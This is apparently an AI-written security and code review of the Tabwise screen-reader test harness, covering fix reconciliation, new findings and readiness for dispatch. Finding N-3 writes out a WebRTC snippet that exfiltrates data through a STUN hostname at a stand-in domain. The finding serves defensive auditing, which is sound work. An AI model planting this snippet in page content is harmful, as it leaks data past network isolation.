# Claude D63 follow-up review: F-1…F-7 reconciliation, observer and executor candidates

- **Reviewer:** Claude (Opus 5.5). Independent and read-only. Codex remains the sole implementer.
- **Brief:** `20261028T222126Z/REVIEW.md`
- **Run time:** 2026-10-29T01:06:19Z (from `date -u`)
- **Verdict:** **BLOCK / NO DISPATCH.** This report does not award a worker PASS, physical-safety clearance, relay equivalence or dispatch approval.

**Evidence classes:**
- SOURCE: read in the sealed snapshot at the cited file:line.
- RUN: a command I ran myself.
- PRODUCER: taken from `producer-tests.txt`.
- INFERENCE: reasoning from the source, with no runtime observation behind it.
- EXTERNAL-UNVERIFIED: browser, relay or GitHub behavior the snapshot cannot establish. I consulted no external documentation.

## 1. Package and commands (RUN)
- The `source-manifest.json` SHA256 is `cb0c36de213e42fb800944aaebd9788f4b35aa50dcffb026365807e97a67c47e`, which matches the brief.
- All 155 manifest entries match their sha256 and byte length (0 mismatches), and exactly 155 files are on disk. The outbox was empty.
- I ran this from `source/`, on Node v24.22.1:
  `node --test --test-timeout=10000 test/r2-capture*.test.mjs test/tabwise-worker.test.mjs test/tabwise-review*.test.mjs test/tabwise-observer.test.mjs test/tabwise-executor.test.mjs test/tabwise-patch-validation.test.mjs test/tabwise-diagnosis-persistence.test.mjs test/tabwise-verdict*.test.mjs web/test/*.test.mjs`
  It reported tests 83, pass 83, fail 0, about 1,012 ms, and exited 0. That reproduces the producer's 83/83.
- **Not run** (out of scope, or excluded by the brief): the headless browser network test, npm test, install, the workflow entry, browser, NVDA, OS input, models and network.
- I did not independently reproduce these producer claims: 331/331, contracts 21/21, web 18/18, the build, the 13-route accessibility check, and the headless local-sink result.
- I did not read the active checkout. I made no edits. My only write is this file.

## 2. F-1…F-7 disposition

| # | Status | Code evidence (SOURCE) | Residual / regression test |
|---|---|---|---|
| F-1 unsupported press before refusal | **FIXED (offline)** | Contracts narrowed: `packages/contracts/palette.mjs:4` (`KEYS` = Tab, Shift+Tab, Enter, Space, type); schema enum at `schemas.mjs:13`. Whole-journey preflight `scripts/tabwise/input-policy.mjs:6-14` runs in `worker.mjs:36` **before** the transport brand check (`:38`) and in `executor.mjs:7` at construction, before any execute. | Covered by `tabwise-review-input.test.mjs`. Becomes physical only through a real loader, which does not exist yet. |
| F-2 partial typed value | **FIXED (hazard prevented; typing still unavailable)** | Safe palette `palette.mjs:1` (`AshaTest`, `invalid.email`). Whole-value check `input-policy.mjs:10` (palette membership plus `^[A-Za-z0-9@.]+$` over the entire string). All typing refused: `worker.mjs:37`, `executor.mjs:8`. | A guarded character executor is absent. Typing qualification is OPEN by design. |
| F-3 provenance after execution | **FIXED** | WeakSet brand `worker.mjs:9-21`, checked at `:38` before any provider call. Explicit destructuring `:39-40` replaces the override-capable spread. The factory is frozen and takes no options (`:12,14`). The `source` label check `:41` is now redundant and harmless. | Spoof and clone cases are tested. |
| F-4 integrity after imports | **FIXED** | Built-in-only checker `scripts/check-r1-baseline.mjs:17-42`: pinned lock digest `:13,21`, every locked file `:23-30`, upstream pins `:31`, and a full vendor tree walk that refuses symlinks and special files `:32-39`. Entry `scripts/tabwise-run.mjs:4-13` loads approval, contracts and worker only by dynamic `import()` after `verifyThenLoad`. I mapped the worker's import graph: contracts `index/schemas/limits/palette`, `src/r2/capture`, `src/speech/{capture,sendguard,runguard}`, `src/repair/apply`, `scripts/tabwise/{input-policy,review-approval,network}`. Each file is covered by either the R1 lock or `REVIEW_FILES` (`review-approval.mjs:5-9`). | Trust-root limitation (INFO, inherent): `check-r1-baseline.mjs` and `review-approval.mjs` are evaluated before anything verifies them. Anyone who can edit them can edit `review-status.json`, so branch protection and the owner's dispatch approval remain the real controls. |
| F-5 self-asserted PASS | **FIXED (inherent limit disclosed)** | `review-approval.mjs:16-23` requires a reviewer, review_ref and owner_approval_ref, an exact sorted file scope, and a content digest recomputed at run time. This runs before the worker import (`tabwise-run.mjs:9`) and again in `liveGate` (`worker.mjs:28`). The unconditional throw is kept (`worker.mjs:31`). `review-status.json` says BLOCK. | It is still self-attesting to repository writers, as the reconciliation states. |
| F-6 network regex bypass | **PARTIAL** | Route-level isolation in `scripts/tabwise/network.mjs:8-21`: service workers blocked, WebSockets closed, every non-navigation request aborted, only `GET /` or `/index.html` on the exact loopback port fulfilled from memory, a restrictive CSP and DNS-prefetch flags. No `route.fetch` or `continue` exists, so there is no upstream redirect path. The regex remains a lint only (`src/repair/apply.mjs:28`). | Non-HTTP egress is open (N-3). Integration into the future headed worker and whole-VM egress are open. |
| F-7 artifact identity and partial uploads | **FIXED (offline); real ingest unexercised** | Attempt binding `web/lib/server/core.mjs:15-19` (a safe-integer attempt equal to the manifest's, plus workflow, event and branch). Attempt-specific artifact name and a re-fetched remote identity check `live-reconcile.ts:24-27`. Non-success runs are never ingested (`reconcile.mjs:27-28`). A refused ingest gives `INCONCLUSIVE` with `evidence:null` (`jobs.mjs:22-23`). The manifest must cover the files exactly (`packages/contracts/index.mjs:117-131`). A strict ZIP subset is enforced (`artifact-zip.mjs`). | Partial blobs can be left orphaned (N-5, LOW). Authenticated ingest has not run against a real run. |

## 3. New findings (most severe first)

**N-1: MEDIUM. Observer connection-loss handling depends on an event the real client never emits.** (SOURCE plus INFERENCE)
- **Where:** `scripts/tabwise/observer.mjs:21-22` subscribes to `close`, `end` and `error` on the client.
  - The vendored `NVDAClient` emits none of these on itself. I grepped `vendor/.../NVDAClient.js` for emits of them and found none.
  - Socket loss is handled internally by `protocolError`, which calls `getGate().stop()` and `this.disconnect()` (`NVDAClient.js:187-195,243-244` in the frozen tree).
  - The test simulates loss with `fake.client.emit('close')` (`test/tabwise-observer.test.mjs:21`), so it exercises a path the real transport does not have.
- **What actually detects loss:** in reality only `guard.isStopped()` inside `read()` (`observer.mjs:35`) does, and only if the injected `guard` **is** the vendored singleton returned by `getGate()`.
- **Counterexample:** the loader passes a guard object that is not identical to the one registered with `setGate`, for example a wrapper or proxy. The relay socket then closes. `protocolError` stops the real gate, and the observer's `read()` keeps returning `connected:true, complete:true` with a frozen phrase list. R2 would then record `observed-silence` over a dead transport.
- **Smallest correction:**
  - Inject `getGate` and require `getGate() === guard` at creation (`:7`) and on every `read()`.
  - Drop the dead listeners, or keep them only as extras.
- **Regression tests:**
  - (a) A fake client that only calls a fake `getGate().stop()` on loss, with no events emitted, must make `read()` return `connected:false`.
  - (b) A non-identical guard must be refused at construction.

**N-2: LOW. The qualification match can fail even when the observer heard the speech.** (SOURCE)
- **Where:** `observer-qualification.mjs:8` requires `after.phrases.includes(primary_phrase)`.
  - The primary report-title call uses `capture:true`, which joins **all** speak messages in its window with `". "` (`NVDAClient.js:360`).
  - The observer stores one entry per speak message (`observer.mjs:15-18`).
- **Counterexample:** NVDA reports the title as two speak messages, `["Tabwise nonce-x", "Google Chrome"]`. The primary phrase is then `"Tabwise nonce-x. Google Chrome"`, which is not in the observer's list. The result is `candidate_pass:false`, wasting the single authorized run. It fails closed, so it is not a safety issue.
- **Smallest correction:** also accept an exact match to a contiguous observer subsequence after `action_started_ms` joined with `". "`. Record which rule matched. Never use fuzzy matching.
- **Regression test:** the two-message case passes. A case with the same parts reordered or missing one fails.

**N-3: MEDIUM (open; does not block the narrow observer test).** HTTP routing does not cover non-HTTP egress. (INFERENCE, EXTERNAL-UNVERIFIED)
- `context.route` and `routeWebSocket` (`network.mjs:13-17`) see only HTTP(S) and WebSocket traffic.
- Two other channels exist:
  - WebRTC ICE/STUN over UDP, with its DNS lookup;
  - `<link rel=preconnect>` and DNS resolution.
  These are not route requests, and Chromium's CSP `connect-src` is not known to govern WebRTC.
- **Counterexample (patched page content):** `new RTCPeerConnection({iceServers:[{urls:'stun:<data>.x.example:3478'}]})` plus `createDataChannel` and `createOffer`/`setLocalDescription`. This can trigger a DNS lookup and a UDP STUN request to x.example, with data encoded in the hostname. The lint regex (`apply.mjs:28`) does not match it.
- **Smallest correction (verify via Context7 at implementation):**
  - a Chromium WebRTC policy flag that disables non-proxied UDP;
  - an init script that deletes `RTCPeerConnection`, `webkitRTCPeerConnection` and `RTCDataChannel` before page scripts run;
  - add `RTCPeerConnection` and `rel=preconnect|dns-prefetch` to the lint;
  - state honestly that hosted runners have no whole-VM egress firewall.
- **Scope:** this matters for patched or verify variants. The observer test serves an owned synthetic page.

**N-4: LOW. A pre-send refusal is labelled as a possible misdelivery.** (SOURCE)
- **Where:** `executor.mjs:33` stops the gate with kind `'send'` for every error, including a foreground refusal before `arm` (`:26-29`). The send guard documents kind `'pre'` as "no key sent".
- **Counterexample:** the foreground check fails. No key is sent, yet the evidence records a possible misdelivery.
- **Correction:** use `state.underlying_started ? 'send' : 'pre'`.
- **Test:** a foreground refusal records `pre`; a failure after `press` starts records `send`.

**N-5: LOW. A partial store leaves orphaned blobs.** (SOURCE)
- **Where:** `artifact-ingest.mjs:9-11` uploads files one by one before `record`.
- **Effect:** a mid-way `store` failure leaves blobs under `run_id/` while the run fails with `evidence_integrity` (`reconcile.mjs:36-38`). They are never scored, because evidence_status stays incomplete, but they are unlabelled.
- **Correction:** on failure, delete the `run_id/` prefix best-effort and record `artifact_cleanup_pending`.
- **Test:** making the second `store` throw yields a cleanup call and no `artifacts` rows.

**INFO, no change required:**
- With approval BLOCK, the workflow now refuses before `decodeSpec` (`tabwise-run.mjs:9` comes before `:14`). That is acceptable.
- `executor.mjs:37` uses `idle(1000)`, while R1 `key()` uses its configured `t`. Measure it.
- The observer records any startup or join speech arriving before the `before` snapshot. That makes the qualification fail closed (`observer-qualification.mjs:6,9`), which is correct. The run plan needs a pre-observer settle period, without ever clearing the journal.

## 4. Candidate assessment

**Observer** (`observer.mjs`), in fake-backed scope:
- Its setup preconditions are correct:
  - an owned PID equal to the relay PID, with the reset confirmed (`:7`);
  - literal `capture:false` (`:29`);
  - a relay-owner recheck after connect (`:30-31`).
- The rest also holds:
  - a stable UUID session; a journal that is append-only, monotonic and capped by count and bytes (`:14-18`);
  - any failure sets a sticky `fail` and stops the gate (`:10`);
  - it never reconnects; its read surface exposes copies only (`:35-36`);
  - normalization is disclosed (`:37`).
- It needs N-1 fixed before binding.
- The caller must still prove that `NVDAClient` is the cached, vendored, frozen class (a `vendorIntegrity` module-identity check).

**Press executor** (`executor.mjs`):
- These all hold in fake-backed scope:
  - whole-journey preflight and sequence lock (`:7,15`);
  - intent persisted before the foreground check and send (`:24`);
  - literal `{capture:false}` (`:31`);
  - abort mapped to one sticky stop (`:12,19`);
  - `busy` held until the underlying `press` settles, so a timed-out send blocks the next action (`:17,31-32,39`);
  - disarm, `setImmediate` and `idle`, with a stop on a non-quiet result (`:35-38`);
  - no R1 acknowledgement is returned to R2 (`:42`);
  - `physical_quiescence_verified` is never true (`:11`).
- Only N-4 remains.

**Teardown** (`observer-qualification.mjs:14-26`):
- It is idempotent and exception-safe. Its order matches the original review: disarm, quiesce, stop if live, final read, observer close, browser close only if quiet, then NVDA stop last.
- It never claims physical quiescence.

**Relay ownership:** checked at observer setup and required before and after in the assessment (`observer-qualification.mjs:5`). E-1…E-5 remain EXTERNAL-UNVERIFIED. No relay run happened.

## 5. Readiness for the narrow observer-equivalence qualification
- **Offline readiness: NOT YET.**
  - The candidates are a sound basis. Before a qualification run can even be reviewed, Codex must fix N-1. N-2 is strongly recommended so the single run is not wasted.
  - The smallest implementation still missing is:
    1. a qualification loader in the R1 order: integrity check, `sendGate`, one-shot `setGate`, load the vendored NVDA module, `setIntegrity(vendorIntegrity)`. It must assert `getGate() === guard` and that the cached `NVDAClient` identity holds;
    2. the R1 guarded report-title wrapper with `capture:true` as the only primary action;
    3. the page/foreground providers and nonce fixture inside `createIsolatedContext`;
    4. a hashed artifact writer covering everything in the qualification doc's artifact list;
    5. a workflow and job for that single manual run, still behind `liveGate`-equivalent refusal until approved.
- **Dispatch authorization: NONE.** A qualification run additionally needs:
  - an independent review of that actual loader and its content seal;
  - the owner's explicit authorization naming the reviewed revision.

  Neither exists, and this report supplies neither. The full worker remains BLOCKED regardless of any qualification outcome.

*End of report. No code changes, runtime NVDA, relay or browser observations, messages to other chats, or approvals.*
